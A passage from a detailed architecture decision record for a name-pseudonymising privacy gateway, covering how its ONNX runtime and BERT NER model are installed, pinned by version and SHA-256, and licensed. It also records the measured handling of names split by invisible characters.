copy of the script's `findFor`), B+F at 0.9 / 0.6 over all 1,998
messages: 933 detections, output SHA-256
`ba1a6b82da7c951da9dda75862bdb7656db17f968294f80255b708be0570c7b3` from
both, 0 messages differing. At every point of the grid, for B+F and A+F
(270 comparisons): 0 differ. Any later change to `joinDetections` must
repeat this check.

### (a) How the runtime dependencies enter the project

1. **`optionalDependencies`, loaded by dynamic `import()` only when
   `PSEUDONYM_NAMES` is on** (pinned exact, in `package-lock.json` with
   integrity hashes).
   - _Names off:_ nothing loads them. But npm installs optional
     dependencies by default (`npm ci` too), so a names-off install still
     downloads them unless the operator runs `npm ci --omit=optional`. If
     one fails to install (unsupported platform, NuGet unreachable), npm
     carries on and the gateway with names off is unaffected.
   - _Names on, but missing or broken:_ the dynamic import fails at
     start-up and the gateway refuses to start (already decided, below).
     A silent optional-install failure therefore becomes a loud start-up
     failure, never a request served without names.
   - _CI:_ `npm ci` installs them, so the name tests can run. On linux/x64
     the `postinstall` fetches the CUDA libraries unless CI sets
     `ONNXRUNTIME_NODE_INSTALL=skip` (decided below, "What CI sets at
     install time"; its effect on download size is measured in step 4).
   - _Code:_ the gateway must not need the packages to typecheck, or
     `tsc` fails on an `--omit=optional` install; the runtime is typed by
     the few members used, as `scripts/compare-names.ts` already does.
   - _Cost:_ by default the same as plain dependencies; avoidable with one
     flag.
2. **Plain `dependencies`, loaded lazily.**
   - _Names off:_ never loaded, but always installed, and an install
     failure is fatal: if the `postinstall` cannot reach NuGet on linux/x64,
     or the platform is not one of the six, `npm ci` fails and **the
     gateway cannot be installed even with names off.**
   - _CI:_ the same install; a NuGet outage fails CI.
   - _Code:_ simplest (ordinary imports and types).
   - _Cost:_ always paid by everyone, with no opt-out.
3. **`peerDependencies` the operator installs.** The project is an
   application (`"private": true`), not a library, so "peer" only means
   "install it yourself". npm 7 and later install non-optional peers
   automatically, which makes them plain dependencies (option 2); marked
   optional in `peerDependenciesMeta` they are not installed at all.
   - _Names off:_ nothing installed, nothing breaks.
   - _Names on:_ the operator runs `npm install` of the two packages; their
     versions are not in our lockfile, so what runs is pinned only by the
     README's instructions, and their integrity hashes are not checked by
     `npm ci`. A wrong version is found at start-up at best, or as
     different spans at worst.
   - _CI:_ an extra install step with versions written in the workflow, a
     second place to keep in step with the docs.
   - _Cost:_ only for those who want names.
4. **A separate companion package** (`pseudonym-names`: the runtime, the
   inference worker and the model fetch; an npm workspace in this repo or
   a repo of its own), which the gateway loads when names are on.
   - _Names off:_ nothing installed, nothing breaks.
   - _CI:_ two packages to build, test and keep at matching versions; the
     100% coverage gate in both; publishing to npm is an outward action
     the user would take.
   - _Cost:_ only for those who want names; the most structure to build
     and explain (rule 7).
5. **A WebAssembly runtime instead of the native one** (added at the
   user's request, 2026-10-03). This changes _which_ runtime, not only how
   it is installed; it combines with options 1 to 4. Two candidates, read
   from the registry and the packages' published files (nothing installed):
   - **5a. `onnxruntime-web` 1.30.0** (MIT; the newest, the same version
     as the native package). 144,618,540 bytes unpacked, 509 files. It
     needs `onnxruntime-common` 1.30.0 (574,567), `protobufjs` (7.6.6:
     3,053,104; its own dependencies not read), `long` (5.3.2: 139,458),
     `flatbuffers` (25.9.23: 288,122), `platform` (47,052) and
     `guid-typescript` (4,549): about 148.7 MB from the packages read, plus
     `@huggingface/tokenizers` (360,962) as today. **Nothing is fetched
     during install**: `onnxruntime-web` has no install script, and the
     only one below it, `protobufjs`'s `postinstall`, reads two
     `package.json` files and may print a version warning (read in
     `scripts/postinstall.js` of 7.6.6). **No per-platform binaries**: the
     runtime is `.wasm` files, the same on every OS and CPU, and the
     package declares no `os` or `cpu`. It has a Node entry point
     (`exports["."].node` → `dist/ort.node.min.mjs`). Most of the 144.6 MB
     is variants we would not load (WebGPU, JSEP, JSPI, asyncify bundles).
     With it, option 2 (plain dependency) can no longer break a names-off
     install on a platform or a network fetch, though everyone would still
     download it.
   - **5b. `@huggingface/transformers` 4.3.0** (Apache-2.0; the newest).
     9,884,823 bytes unpacked itself, but it **is not a WebAssembly
     runtime under Node**. Its `src/backends/onnx.js` loads
     `onnxruntime-node` whenever it runs in Node ("When running in node, we
     use `onnxruntime-node`"), and the devices it accepts there are `cpu`,
     `webgpu` and, by platform, `dml`, `cuda` or `coreml`; `wasm` is
     offered only outside Node. Its dependencies are not optional:
     `onnxruntime-node` 1.30.0 (301,068,136, **with the same NuGet fetch on
     linux/x64**), `onnxruntime-web` pinned to a dev prerelease
     (`1.31.0-dev.20260914-8d85527a0`, 144,895,056), `sharp` ^0.35.4
     (image library; 0.35.5: 962,168, no install script, but **native
     binaries for each platform** as optional `@img/sharp-*` packages, sizes
     not read), `@huggingface/jinja` (400,133) and
     `@huggingface/tokenizers` ^0.2.0 (360,962): at least 457.6 MB from the
     packages read. So it costs more than option 1, includes the native
     runtime anyway, and adds an image library and a dev build we would not
     use (ADR-035 already declined it for 6a for the same reason).
   - _Names off, CI, cost:_ for 5a as option 1 (or 2) with nothing fetched
     at install and nothing per platform; for 5b worse than option 1 on all
     three.

   **Which runtime produced the 6a numbers.** `onnxruntime-node` 1.30.0,
   native, loaded from `D:\pseudonym-6a` (`scripts/compare-names.ts`,
   `runtime()`), with `InferenceSession.create` given no execution
   providers, so its default CPU provider; tokens from
   `@huggingface/tokenizers` 0.2.0 (JavaScript). On Windows 11 x64, Intel
   i5-12450H, 12 logical CPUs. The same setup reproduced the spans
   exactly three times (the 6a run and the two runs around step 2).

   **Would the span SHA-256s change on WebAssembly? I do not know; it would
   have to be measured, and it would cost a re-measurement.** What is
   known: the span hash covers each span's start, end **and score** as
   JSON numbers at full precision (`spanHash` in `runChild`), so a
   difference in the last bit of any score changes it, even when every
   detection is the same. Nothing I have read promises that the WebAssembly
   build computes the same floating-point results as the native one (they
   run different kernels: the native runtime chooses its own for this CPU,
   the WebAssembly build uses WebAssembly's 128-bit SIMD), so the hash is
   likely to change, and only a run can say whether any detection, and so
   R, precision or false positives, changes. The cost of switching:
   - B re-run on the generated set under WebAssembly, and if the hash
     differs, the ADR-035 table re-scored and re-published (B's run took
     155 s and 264 s in the two runs around step 2; F has no model and is
     unaffected).
   - **The held-out figure cannot be re-measured.** It was run once, on
     the native runtime, and the set is spent for names; after a switch,
     the published held-out number would describe a different runtime for
     good.
   - Speed under WebAssembly is not measured; B already fails the speed
     limit natively (286 ms per KiB).
     The same caveat applies to the native runtime on another machine: it
     also chooses kernels by CPU, so whether Linux CI reproduces the Windows
     spans is the open question ADR-035 left for 6c, whichever runtime ships.

**Recommendation: option 1, on the native runtime (not 5). Accepted by
the user (2026-10-03).** It is the only option that keeps the exact versions and integrity hashes in our
lockfile (unlike 3), never stops a names-off install from succeeding
(unlike 2), and stays one package (unlike 4). Its weakness, that optional
installs fail quietly, is covered by the start-up rule already decided:
names on and the runtime unloadable means the gateway does not start. Its
other weakness, that everyone downloads it by default, is documented with
the `--omit=optional` opt-out, and Docker (Phase 8) can build without it.
5a would remove the install-time fetch and the per-platform binaries, but
it is not the runtime that was measured: every published names number,
the held-out one included, describes `onnxruntime-node`, and moving would
at least mean re-measuring the generated set and leaving a held-out
figure that no longer describes the shipped code. 5b is not a WebAssembly
option under Node at all.

**What CI sets at install time (decided now, not in 6c).**

- _Option 1 or 2 (native, the recommendation):_ the `npm ci` step gets
  `ONNXRUNTIME_NODE_INSTALL: skip` in its `env`. The install script reads
  that variable first (`parseInstallFlag` in `script/install-utils.js`)
  and exits before fetching anything; the CPU runtime for linux/x64
  (`libonnxruntime.so.1` and `onnxruntime_binding.node`) is in the package.
  No `--omit=optional`: 6c's name tests need the runtime. Not
  `--ignore-scripts`, which would also stop every other package's install
  script. Confirmed when the first CI run loads the model (6c).
- _Option 5a:_ nothing; nothing is fetched at install.
- _Option 5b:_ the same `ONNXRUNTIME_NODE_INSTALL: skip`; `sharp`'s
  platform package would still be installed.
- _Options 3 and 4:_ the explicit install step of the two packages gets
  the same variable.
  The same setting applies to the Docker build (Phase 8).

**The skip is an assumption, read from the package, not verified.** What
was read (the 6a copy of `onnxruntime-node` 1.30.0, on Windows): the
install script exits when `ONNXRUNTIME_NODE_INSTALL` is `skip`, its
metadata lists only the CUDA 12 libraries as files to fetch for
linux/x64, and the package's `bin/napi-v6/linux/x64/` holds
`libonnxruntime.so.1` and `onnxruntime_binding.node`. What was not done:
no install on Linux with the variable set, and no model loaded there.
**It is verified in 6c**, in the first CI run that loads the model, by
two checks: after `npm ci`, those two files exist under
`node_modules/onnxruntime-node/bin/napi-v6/linux/x64/`, and an inference
session on B's model is created and runs (the 6c name tests).
**Fallback, decided now:** if either check fails, CI drops
`ONNXRUNTIME_NODE_INSTALL` and lets the install script fetch what its
metadata asks for (the CUDA 12 libraries from NuGet), accepting the
download and the dependency on NuGet in CI; the size is measured then and
written here, and the Docker build follows the same choice. Not
`--ignore-scripts` and not a hand-copied binary: the first would stop
every package's install script, the second would put a file in CI that
no lockfile pins.

> **Verified in Phase 6c (2026-10-07), and the setting does real work.**
> With the skip, on Linux (a Docker container on the i5-12450H and three
> GitHub runner jobs): the two files are present, no provider library is
> fetched, `onnxruntime-node` is 301,068,136 bytes, and the names tests and
> `eval:names` run on B (both checks pass; the fallback was not needed).
> Without it (Names run #4, `default`): the install script downloads the
> CUDA, TensorRT and shared provider libraries, **273,153,528 bytes more**
> (574,221,664 in all; the CUDA provider alone 272,054,000), and none of
> them is ever loaded. So `ONNXRUNTIME_NODE_INSTALL: skip` in CI's `npm ci`
> and in the Names workflow saves **about 273 MB of NuGet download and disk
> per install** on linux/x64, and takes NuGet out of CI's dependencies. It
> is not a no-op. The figures are in "Step 4b … the GitHub runners", below.

**The runtime is pinned exactly, with a bump procedure.** `package.json`
lists `onnxruntime-node` as `"1.30.0"`, no caret and no tilde (and
`@huggingface/tokenizers` as `"0.2.0"`), and `package-lock.json` records
its integrity hash. Until now only the model files and the name list had
integrity checks; the runtime had none, and it is the third input the
held-out figure depends on ("What the held-out measurement froze",
below). The exact pin closes that gap: the lockfile's hash is checked by
`npm ci`, and no install can drift to another version. **To bump it:**

1. Change the exact version, nothing else in the same commit.
2. Re-run the comparison on the generated set (A, B and F, as in
   step 2) and compare span SHA-256s and every metric with the run before
   the bump.
3. If they are identical, the published numbers stand for the new version;
   record the bump and the hashes in this ADR.
4. If any span SHA-256 moves: publish the re-measured generated numbers,
   and **re-label the held-out figure as describing the previous runtime**
   ("41/45 with `onnxruntime-node` 1.30.0"), never keep it as if it
   described the new one. It cannot be re-measured.
   The same applies to `@huggingface/tokenizers`, whose token ids feed the
   model.

**`libphonenumber-js` is pinned exactly too (2026-10-03, after step 3).**
The same hazard for a different input: ADR-004 pinned it with a tilde on
purpose, so that patch releases would bring new phone-number metadata. But
two mutations of the spaced-mobile detector, S4 and S6, are equivalent
only because of facts in that metadata (no 6- to 9-digit number starting
6 to 9 is valid for India; every 10-digit one is), and every published
PHONE number was measured with it. A patch release could change either
fact or any number without a code change. So `package.json` and the
lockfile's root entry now say `"1.13.14"` (the version already installed;
nothing was installed or upgraded), and the two facts are a test
(`test/unit/detection/phone-metadata.test.ts`). **To bump it:** change the
exact version, nothing else in the same commit; the metadata test, the
whole suite and `npm run eval` must pass; if any evaluation count moves,
accept it with a note here saying it came from the metadata, not from
tuning. The cost, accepted: validation goes stale until someone bumps it,
which ADR-004 had wanted to avoid.

**The CI runner's OS label is pinned too (2026-10-06).** The workflow ran
on `ubuntu-latest`, a label GitHub moves to each new Ubuntu release on its
own schedule (to Ubuntu 26.04 from 19 October 2026, by the user's
reading of GitHub's announcement; the runner-images README read on
2026-10-06 said `ubuntu-latest` is `ubuntu-24.04` and gave no date). That
made the operating system an input that changes under us, the hazard the
pins above close. `.github/workflows/ci.yml` now says
`runs-on: ubuntu-24.04`, the image `ubuntu-latest` pointed to. **What this
does not pin:** GitHub rebuilds the image under a label about weekly, with
updated tools and packages, and a workflow cannot ask for one build of it.
The exact image version is not something we can pin, and pinning it would
not have changed this decision; so CI is pinned in its operating system
release, its Node version (`.nvmrc`), its actions (commit SHAs) and its
packages (`package-lock.json`), not in everything else on the image.
**To bump it:** change the label, nothing else in the same commit; the
workflow must pass on the new label 3 to 5 times in a row (the stability
check of Phase 5d part 7), and the timing tests' worker count is checked
against the new runner's CPU count (ADR-032). GitHub retires an old label
some time after a new one appears, so the bump has a deadline set by
GitHub, not by us.

**One commit has not run through CI yet (2026-10-06).** Local `main` is
one commit ahead of `origin/main`: 9ec51b7 ("stop name widening at
validated values") was never pushed, so CI has never checked it. It will
be checked for the first time when the `wip/bug-61-masking` branch is
squashed into `main` and pushed.

### (b) How the model file reaches a machine

1. **Committed to the repo.** Not possible for B: 178.5 MB is over GitHub's
   100 MiB block. (A smaller model would still put every version into
   every clone forever.) SHA-256 would be checked at load only.
2. **Git LFS.** Works, at a cost: everyone needs `git-lfs` (without it a
   clone gets a pointer file of a few hundred bytes in place of the
   model), CI needs `lfs: true` on `actions/checkout`, and every download
   counts against the owner's 10 GiB a month: about 60 downloads of the
   model file (10 GiB / 178,495,423 bytes), CI runs, forks and other
   people's clones together, before the quota runs out. LFS addresses each
   object by its SHA-256 and checks it when it downloads; we would still
   check at load (a pointer file left in place fails that check, and the
   gateway refuses to start).
3. **A download script, pinned URL and SHA-256 in the repo** (for
   example `npm run fetch:model`). URLs pinned to the Hugging Face commit
   (`https://huggingface.co/Xenova/bert-base-multilingual-cased-ner-hrl/resolve/263e82c06569…/<file>`;
   the full commit id written in the script), one SHA-256 per file (the
   four files above; values as recorded in `D:\pseudonym-6a\models\SHA256SUMS`
   for 6a), into a gitignored directory.
   - _Checked at download:_ each file is written to a temporary name,
     hashed, and renamed into place only if it matches; on a mismatch the
     temporary file is deleted, the script prints the file name and both
     hashes (not personal data) and exits non-zero. A bad download never
     sits where the gateway looks.
   - _Checked at load:_ the gateway hashes the four files at start-up and
     refuses to start on any mismatch or missing file (already decided).
     This is the check the guarantee rests on; the download check only
     makes the failure early and clear. Load-time hashing costs start-up
     time on a 178.5 MB file, measured in step 4.
   - _CI:_ one download per run unless cached (an `actions/cache` keyed by
     the SHA-256 values); depends on Hugging Face being reachable; no LFS
     quota.
   - _If the source goes away:_ the download fails loudly; the pin means
     it can never silently change. A mirror (for example a GitHub release
     asset) can be added later with the same hashes.
4. **Fetched at runtime on first use.** The gateway itself would make an
   outbound call to a third party while serving: a privacy gateway with
   egress beyond its provider, which an operator has to allow in their
   firewall; it needs a writable directory at run time (a read-only,
   non-root container has none); and it conflicts with the decided rule
   that a load failure refuses start-up, since on first use the gateway
   has already started (the first request would wait for 178.5 MB, or get
   503). Hashed after download and before load; a mismatch would be a 503
   for that request and every later one.

**Recommendation: option 3, SHA-256 checked at both download and load.
Approved by the user (2026-10-03).** It works within GitHub's limits with
no quota, keeps the repo small, makes the model an explicit, verifiable
install step, and keeps the running gateway free of any network call
except to its provider. The load-time check is the one that enforces the
rule; the download-time check keeps a bad file from ever being put in
place. Option 3 redistributes nothing (the operator downloads from the
source), while 1 and 2 would put the model in our MIT repo.

**If the pinned URL stops resolving** (the repository or the commit is
removed from Hugging Face, or Hugging Face is unreachable): **names cannot
be enabled** on a machine that does not already have the files, because
`fetch:model` fails and the gateway with names on refuses to start without
four matching files. **Names off is unaffected**: with names off the
gateway never downloads, reads or hashes the model, and `npm ci` does not
involve it. Machines that already hold the verified files keep working. A
copy of the same bytes hosted elsewhere has the same SHA-256 values, so a
mirror needs no new measurement; a different file is a different model,
which means a new pin and a new measurement.

**The model's licence (read 2026-10-03; not legal advice).**

- The files come from `Xenova/bert-base-multilingual-cased-ner-hrl` at
  commit `263e82c06569c8c2ac46238a7ae5107598934234`. **That repository
  states no licence**: no `license` in its card's metadata, no licence tag
  (Hugging Face API). Its card says it is Davlan's model "with ONNX weights
  to be compatible with Transformers.js" (`base_model:
Davlan/bert-base-multilingual-cased-ner-hrl`).
- **`Davlan/bert-base-multilingual-cased-ner-hrl` is AFL-3.0** (card
  metadata `license: afl-3.0`). It is a fine-tune of
  `google-bert/bert-base-multilingual-cased`, which is Apache-2.0.
- **What AFL-3.0 permits (SPDX text):** a worldwide, royalty-free licence
  to reproduce, adapt, distribute and use the work (§1, §15 "Right to
  Use"), with a patent licence (§2). Running it inside a gateway other
  people use over a network is an "External Deployment" (§5), which AFL
  treats as distribution under §1(c); §1(c) lets it be distributed under
  any licence that does not contradict AFL's terms, so this use is
  permitted. Conditions that apply: keep its copyright and licence notices
  in a derivative work's source (§6); no use of the licensor's name to
  endorse (§4); when distributing, make a reasonable effort to obtain the
  recipient's assent to the licence (§9); the licence ends for anyone who
  sues claiming the work infringes a patent (§10).
- **Open points, recorded rather than resolved:** (1) the converted files
  we download carry no licence statement of their own; our use rests on
  them being a conversion of Davlan's AFL-3.0 model, as the card says. The
  alternative, converting Davlan's weights ourselves, needs Python (not
  installed, declined in 6a) and would produce a different file, and so a
  new measurement. (2) Davlan's card lists its training data (CoNLL 2002
  and 2003, ANERcorp, Europeana Newspapers, I-CAB, Latvian NER,
  Paramopama + Second HAREM, MSRA), whose own terms were not checked;
  whether a dataset's terms reach a model trained on it is not settled
  and not something this ADR can decide.
- **The project's own `LICENSE` (MIT) is unaffected:** the model is
  downloaded by the operator at install time, never bundled in or
  distributed with this repository.
- **What the project does:** the README names the model, its source
  repository and commit, Davlan's model and AFL-3.0 (linked), Google's
  BERT and Apache-2.0, and the two open points above; `fetch:model`
  prints the licence name and link when it downloads, so an operator sees
  it before using the model (the §9 assent effort is theirs to make for
  their own users).

**The name list: a second distributed artifact.**

- _What and where:_ F's word set, built from the `gazetteer` half of
  `src/synthetic/wikidata-names.ts`. Unlike the model it is already in the
  repo, as source: the file is 44,742 bytes and holds both halves. The
  gazetteer half has 925 entries (given and family names), which make 718
  distinct strings: 607 Latin spellings, lower-cased, and 111 Devanagari
  spellings. In a canonical form (the strings sorted by UTF-16 code unit,
  JavaScript's default sort, joined by LF, as UTF-8) that is 6,186 bytes.
- _Origin:_ **Wikidata, CC0 1.0** (the file's header and
  `https://www.wikidata.org/wiki/Wikidata:Licensing`); generated by
  `scripts/fetch-wikidata-names.ts` on 2026-10-02 (UTC), the queries and
  counts in its header; committed once (`01cf209`, 2026-10-03 01:31 IST)
  and unchanged since, so it is the file the 6a run used (the run started
  after that commit). A name goes to a half by FNV-1a (32-bit) of its
  Latin spelling: even to `eval`, odd to `gazetteer`.
- _Pinned:_ by the commit, not by a URL. Re-running `npm run gen:names`
  would not reproduce it (Wikidata changes daily), so the committed file
  is the pin.
- _SHA-256:_ the canonical form above, measured 2026-10-03:
  **`313b89ea3a88ba35265f8f8bf5d2022c8dd85e90cdff4744bc3bb388821f3951`**.
  Proposed (built in step 3 or 4): the same value pinned as a constant,
  checked by a unit test (so CI fails if `gen:names` is re-run and the
  file changes) and, with names on, at start-up over the set the gateway
  actually built. There is no download, so no download-time check.
- _On mismatch:_ with names on, **the gateway refuses to start**, as for
  the model; names off does not build the set and is unaffected. A test
  failure blocks the change in CI.
- **The shipped list must be exactly this `gazetteer` half, by this hash
  split.** The 81.8% (B+F, 501/612) was measured with F reading this set
  and no other. A different list, a re-fetched one or both halves, makes
  F behave differently and the figure stops describing the shipped code.
  Both halves would be worse than wrong: the `eval` half is where the
  generated names block draws its names, so F would find them by list and
  any re-measurement on the generated set would be inflated.

### Already decided (the user, 2026-10-03; recorded, not open)

- **A load failure or a SHA-256 mismatch refuses start-up.** With names on,
  the gateway does not start unless the runtime loads and every model file
  matches its pinned hash.
- **A timeout, a full queue or a crashed worker returns 503** with a fixed
  message, and **never silently falls back to names off**: a request is
  never forwarded without name detection when names are on.
- **A crashed worker is not restarted automatically.** Health reports
  unhealthy until the process is restarted.

### A name cut short at an invisible character (measured and decided 2026-10-03: option 2)

**The gap.** F's word pattern and `widenToWords` stop at a
Default_Ignorable character (soft hyphen, zero-width space, BOM: they are
neither letters nor marks), and BERT's word splitter treats a BOM as a
space (JavaScript's `\s` includes U+FEFF). So a name written with one of
these inside it can come out with only the part before or after it
covered, and the rest is sent. The user asked whether such a span can be
treated as unmappable and refused, like the other fail-closed cases.

**The check, as probed.** After the measured path (B and F spans, the
tiers, `joinDetections`), a joined name span whose edge stops at one or
more Default_Ignorable characters with a letter or mark right behind them
fires. It changes nothing in the measured path: it only reads its output.

**Measured** (scratch probe, B run as 6a ran it; counts only):

| Text                                                                                 | Messages | Fires in | A name under the firing span | No name under it (false refusal)           | PERSON values partly covered | of which in a message it fires in |
| ------------------------------------------------------------------------------------ | -------- | -------- | ---------------------------- | ------------------------------------------ | ---------------------------- | --------------------------------- |
| Generated set as it is                                                               | 1,998    | 0        | 0                            | 0                                          | 14 of 765                    | 0                                 |
| Same, a soft hyphen in the middle of every Latin word of 6+ letters (8,377 inserted) | 1,998    | 131      | 45                           | 86 (4.3% of messages; 2.6 per 1,000 words) | 64 of 765                    | 44                                |

- On every measured input it fires 0 times, so adding it leaves every
  published generated-set number as it is. Whether it would fire on the
  held-out set cannot be checked without looking at it; it can only add
  refusals there, never take coverage away.
- The 14 partly covered values on plain text are the model taking part of
  a name, unrelated to invisible characters; the check does not touch
  them.
- The hyphenated text is a worst case of pasted, hyphenated documents
  (every long word hyphenated); real documents hyphenate fewer words, so
  the false refusals there would be fewer, by an amount not measured.

**Options (for the user):** (1) refuse the request when it fires (503,
fixed message), as asked: 44 of the 64 partial names caught, at 86 false
refusals in the worst case above; (2) extend the span over the invisible
characters to the end of the word when it fires: no refusals, the rest of
the word redacted instead (not measured; costs over-redaction on the 86);
(3) neither, recorded as a bypass in the README and user manual. Until
names are wired, nothing ships either way.

**A property of option 1, whatever is chosen:** it refuses on input the
sender controls. Anyone who can put text into a request (a pasted
document, a prompt-injected page, a hostile form field) can insert soft
hyphens next to a name-like word and make the gateway refuse that
request: it converts a leak into an availability bypass, a way to stop
requests from being served.

**The decision rule, set by the user before option 2 was measured**
(given 2026-10-03; written here at 12:56 IST, before the probe for it was
written or run): measure option 2 on the same worst case as option 1 (the
generated messages with a soft hyphen in every Latin word of 6+ letters).
**Choose option 2 unless it over-redacts non-name text in more than 86
messages** (the count option 1 refuses); above 86, choose option 1. Apply
it as written whichever way it falls. Also reported: the extra characters
redacted, how many of the 64 partly covered names option 2 covers in
full, and that it fires 0 times on the unmodified generated set.

**Option 2 measured (2026-10-03, after the rule above).** Option 2 as
probed: when a joined name span's edge stops at one or more invisible
characters with a letter or mark right behind them, the span extends over
them and the following letters and marks, repeatedly, to the end of the
word; spans that then meet are merged. Same scratch probe and B run as
option 1, which reproduced option 1's figures (fires on 134 spans in 131
messages).

| Text                                  | Fires in | Messages with non-name text pulled in | Extra characters outside names                                              | Partly covered names fully covered | Still partly covered |
| ------------------------------------- | -------- | ------------------------------------- | --------------------------------------------------------------------------- | ---------------------------------- | -------------------- |
| Generated set as it is                | 0        | 0                                     | 0                                                                           | 0 of 14                            | 14                   |
| Soft hyphen in every Latin word of 6+ | 131      | **86**                                | 424 (337 visible, 87 soft hyphens; 29 of them inside other labelled values) | 27 of 64                           | 37                   |

**Decision, by the rule as written: option 2** (86 is not more than 86).
On every measured input it fires 0 times, so every published
generated-set number stands. Two facts, recorded and not used to revisit
the rule: the comparison is close to a tie by construction (both options
fire on the same spans, and option 2 over-redacts where a firing span has
no name under it, which is where option 1 refuses falsely); and option 2
leaves 37 of the 64 partly covered names partly covered, against 20 under
option 1 (those outside the messages it refuses). When names ship, the
README and user manual state the remaining case: a name broken by an
invisible character is covered to the end of the word only when the
model or the list found part of that word, and a second word of a name is
not reached this way.

### Constraint on step 3 (the user, 2026-10-03; settled)

Two pieces of the measured configuration still live only in
`scripts/compare-names.ts`: **the B+F join** (`combine` and the
held-out branch: each candidate's detections at its point, then `merge`
of the union) and **the construction of F's word set** (`GAZETTEER`,
from the `gazetteer` half of `WIKIDATA_NAMES`). Step 3 **moves** them into
`src/`, it does not reimplement them, to the same standard as step 2:
imports and paths only, no logic changes, no renames, the script then
calls the moved code, and the comparison's span SHA-256s (and every
metric) before and after prove nothing changed. A join or a word set
written afresh inside the gateway would mean the shipped behaviour and
every measured number describe different code, however alike they look.

**Done (2026-10-03), before the pipeline wiring.** Moved:
`GAZETTEER` (verbatim, now exported) to `src/detection/names/gazetteer.ts`;
the join, the inline `(text) => merge([...a(text), ...f(text)])` in
`combine`, to `joinDetections(model, list)` in
`src/detection/names/join.ts` (body `merge([...model, ...list])`), with
`NO_SCORE` (`{ high: 0.5 }`, the point F's spans go through before the
join). `combine` itself stays in the script: it scores (`measure`, a
`Measured` row, summed ms per KiB), and moving it would make `src/`
import `eval/`; it now calls `joinDetections`. **The held-out branch did
not move and was not edited**; it keeps its own inline union
(`merge(finds.flatMap(…))`), so two copies of the join exist, the
held-out one frozen with the figure it produced. Proof: comparison runs
before (`D:\pseudonym-6a\runs\2026-10-03-join-before`) and after
(`…-join-after`), A, B and F on the generated set: span SHA-256s
identical (and identical to the 6a run), every metric of all five rows
and the decision identical. No existing test file changed; one new file,
`test/unit/detection/names/join.test.ts` (the join, `NO_SCORE` pinned,
the list's size and canonical SHA-256, no `eval`-half spelling in it),
needed for 100% coverage of the new module; 8 of 8 mutations caught.

**Consequences (if (a)'s recommendation is accepted too).** `package.json`
gains two exact `optionalDependencies`; a `fetch:model` script, a pinned
hash list and a gitignored model directory are added in step 4, which also
measures the install size on disk, the postinstall download with and
without `ONNXRUNTIME_NODE_INSTALL=skip`, and the start-up hashing time.
CI's `npm ci` step sets `ONNXRUNTIME_NODE_INSTALL: skip` (decided above).
The name list's hash is pinned in a test and checked at start-up. The
README says names need `npm run fetch:model` and the runtime, that
`npm ci --omit=optional` gives a names-off install without them, and the
model's licence with its open points.

### Step 4a: installed and measured (2026-10-07)

Not built in 4a: the worker, any inference session, any run of the model.
With names on, the gateway still refuses to start (after the checks below).

**Installed.** `npm install --save-optional --save-exact onnxruntime-node@1.30.0 @huggingface/tokenizers@0.2.0`
(Node 22.23.3, npm 11.11.0, Windows 11 x64). `package.json` gained
`optionalDependencies` `"@huggingface/tokenizers": "0.2.0"` and
`"onnxruntime-node": "1.30.0"`, no caret or tilde. Their lockfile
integrity values equal the registry's and the 6a runtime's lockfile
(`onnxruntime-node` `sha512-twhs1C2C…GOfIqw==`, `@huggingface/tokenizers`
`sha512-LidMHe1F…rr99pg==`), and every other added package has the version
the 6a runtime had. 16 packages added, all marked `optional` in the
lockfile: the two, `onnxruntime-common` 1.30.0, `adm-zip` 0.6.1,
`global-agent` 4.1.3 and its 11 dependencies (`define-data-property`,
`define-properties`, `es-define-property`, `es-errors`, `globalthis`,
`gopd`, `has-property-descriptors`, `matcher`, `object-keys`,
`serialize-error`, `type-fest`). Licences: MIT, except
`@huggingface/tokenizers` Apache-2.0, `global-agent` BSD-3-Clause,
`type-fest` MIT or CC0-1.0. Only `onnxruntime-node` has an install script.
Two other lockfile lines changed: its root `engines` was stale (`>=22`)
and now matches `package.json` (`>=22.20.0`), and `escape-string-regexp`
went from `dev` to `devOptional` (`matcher` shares it).

**On disk, Windows x64 (file sizes summed):** the 16 packages are
**302,509,647 bytes in 537 files** (296,454 KiB allocated); `node_modules`
went from 137,573,943 to 440,091,084 bytes. `onnxruntime-node` alone is
301,068,136 bytes in 43 files, exactly its registry size: **its
postinstall fetched nothing on win32/x64** (its metadata requires nothing
there; npm printed only the script's header). Its native binaries:
win32/x64 67,075,688 bytes, win32/arm64 72,737,344, linux/x64 46,218,000,
linux/arm64 25,530,144, darwin/arm64 89,446,696. **There is no darwin/x64
build**: on an Intel Mac the runtime cannot load, so names on would refuse
start-up there (not checked further). **Linux is unmeasured** (the install
size, and the NuGet download with and without
`ONNXRUNTIME_NODE_INSTALL=skip`) until 6c.

**`npm audit`** reported one high-severity advisory after the install:
`source-map-js` 1.2.1 (GHSA-68fv-2mgg-jv7q), reached through `vitest` →
`vite` → `postcss` and `@vitest/coverage-v8` → `magicast`: dev only, and
already in the lockfile before this step (the lockfile diff does not touch
it), so a newly published advisory, not something these packages
brought. Not changed in this step. **The fix (noted 2026-10-07, step
4b):** Dependabot's pull request #1 bumps `source-map-js` from 1.2.1 to
1.2.2, and the advisory's affected range is `>=1.0.0 <1.2.2` (the audit
report of step 4a), so 1.2.2 is the fixed version. It needs **no bump
procedure**: the procedures above exist for the four inputs the held-out
names figure froze (runtime, tokenizer, model bytes, name list) and for
`libphonenumber-js`'s metadata, and `source-map-js` is none of them. It
is a development dependency of the test tools (source maps for coverage
and Vite), never loaded by the gateway, and touches no measured number.
The pull request is the user's to merge.

**The model files, measured.** `npm run fetch:model`
(`scripts/fetch-model.ts`, `scripts/model-download.ts`) downloaded the
four files from Hugging Face at the pinned commit into an empty `models/`
in 14 s; each matched its pinned size and SHA-256. Hashed again with a
separate tool (`sha256sum`), with the same result. They equal the values
the 6a download recorded, so the gateway checks for the bytes ADR-035
measured:

| File                        | Bytes       | SHA-256                                                            |
| --------------------------- | ----------- | ------------------------------------------------------------------ |
| `config.json`               | 1,207       | `7aa891abae067f95a40f5e2005b3de44824a083f256802934a993d301ec25076` |
| `tokenizer.json`            | 2,919,362   | `bf1b59b7b11c95f194f51708d918eea378e09d05f84c0e1656dc5180e8117088` |
| `tokenizer_config.json`     | 367         | `e6f3b96db926a37d4039995fbf5ad17de158dfb8f6343d607e4dbaad18d75f5a` |
| `onnx/model_quantized.onnx` | 178,495,423 | `5b65139844be260b624a2a13782b01d122e613d64ce16ed0ba4d82e0b816f1a9` |

The pins live once, in `NAME_MODEL` (`src/gateway/name-model.ts`), read by
both the script and the gateway, and are repeated in a test so that an
edit to them fails it. The script writes each file to
`<file>.download`, stops a response longer than the pinned size, hashes it
with the same function the gateway uses, and renames it into place only on
a match; otherwise it deletes the temporary file, prints the file name and
both hashes, and exits 1 at the first refused file. A file already in
